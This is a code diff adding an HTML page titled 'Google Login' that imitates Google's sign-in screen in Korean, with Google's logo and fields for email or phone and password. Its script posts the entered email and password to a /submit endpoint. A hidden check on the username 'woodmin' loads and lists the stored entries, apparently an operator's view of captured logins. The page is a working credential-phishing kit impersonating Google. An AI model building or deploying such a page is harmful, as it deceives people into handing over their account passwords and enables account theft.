@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Google Login</title>
+  <style>
+    body {
+      font-family: 'Roboto', sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      background-color: #fff;
+    }
+    .login-container {
+      width: 360px;
+      padding: 40px;
+      border: 1px solid #dadce0;
+      border-radius: 8px;
+      text-align: center;
+    }
+    .google-logo {
+      width: 75px;
+      margin-bottom: 10px;
+    }
+    h1 {
+      font-size: 24px;
+      margin-bottom: 30px;
+      color: #202124;
+    }
+    input {
+      width: 100%;
+      padding: 13px 15px;
+      margin: 8px 0;
+      border: 1px solid #dadce0;
+      border-radius: 4px;
+      font-size: 16px;
+      box-sizing: border-box;
+    }
+    button {
+      background-color: #1a73e8;
+      color: white;
+      padding: 12px 24px;
+      border: none;
+      border-radius: 4px;
+      font-size: 14px;
+      cursor: pointer;
+      margin-top: 20px;
+    }
+    button:hover {
+      background-color: #1557b0;
+    }
+    ul#list {
+      margin-top: 20px;
+      text-align: left;
+      padding-left: 0;
+      list-style: none;
+    }
+    ul#list li {
+      padding: 5px 0;
+      border-bottom: 1px solid #eee;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="google-logo">
+    <h1>로그인</h1>
+    <input id="emailInput" type="email" placeholder="이메일 또는 휴대전화">
+    <input id="passwordInput" type="password" placeholder="비밀번호">
+    <button onclick="sendData()">로그인</button>
+
+    <ul id="list"></ul>
+  </div>
+
+  <script>
+    function sendData() {
+      const email = document.getElementById("emailInput").value;
+      const password = document.getElementById("passwordInput").value;
+
+      fetch("/submit", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({ email, password })
+      })
+      .then(res => res.text())
+      .then(result => {
+        alert(result);
+        if (email === "woodmin") {
+          loadData();
+        }
+      });
+    }
+
+    function loadData() {
+      fetch("/load")
+        .then(res => res.json())
+        .then(data => {
+          const list = document.getElementById("list");
+          list.innerHTML = "";
+          data.forEach(row => {
+            const li = document.createElement("li");
+            li.textContent = row[0] + " - " + row[1] + " (" + row[2] + ")";
+            list.appendChild(li);
+          });
+        });
+    }
+  </script>
+</body>
+</html>
